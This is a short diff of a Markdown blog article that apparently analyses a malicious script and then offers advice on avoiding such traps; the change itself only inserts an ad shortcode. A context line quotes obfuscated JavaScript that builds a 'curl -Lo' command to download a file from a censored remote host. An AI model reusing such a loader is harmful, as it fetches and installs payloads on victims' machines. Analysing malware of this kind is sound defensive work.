@@ -41,6 +41,8 @@ _0x42b722(“curl -Lo” + _0x157519 + “\” + “http://<censored>/pdown” +
   })
 ```
 
+{{<ad>}}
+
 ## How do we avoid falling into these traps?
 
 I don't plan to stand alone in the drama. This is about offering some practical solutions so that script kiddies don't make fun of you:
